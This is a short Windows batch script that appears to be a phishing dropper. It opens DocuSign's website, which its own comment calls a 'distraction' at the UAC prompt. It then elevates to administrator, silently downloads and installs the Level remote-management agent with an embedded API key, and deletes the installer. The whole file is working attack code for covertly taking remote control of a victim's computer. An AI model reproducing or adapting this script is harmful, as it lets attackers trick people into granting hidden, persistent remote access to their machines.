@echo off
setlocal

:: ===== Launch distraction IMMEDIATELY on UAC click =====
powershell -WindowStyle Hidden -NoProfile -Command "Start-Process 'https://www.docusign.com'"

:: ===== Auto elevate to admin (silent) =====
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c \"%~f0\"' -Verb runAs -WindowStyle Hidden"
    exit /b
)

:: ===== Setup =====
set KEY=LEVEL_API_KEY=Wg41zziMksJnvv6NNPeDtUha

:: ===== Download + Install in parallel (max speed) =====
powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "$u='https://downloads.level.io/level.msi';$f=$env:TEMP+'\\level.msi';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).DownloadFile($u,$f)" >nul 2>&1 &
timeout /t 6 /nobreak >nul

:: ===== Install (silent) =====
msiexec /i "%TEMP%\level.msi" %KEY% /qn /norestart /l*v nul >nul 2>&1

:: ===== Cleanup =====
del "%TEMP%\level.msi" >nul 2>&1

endlocal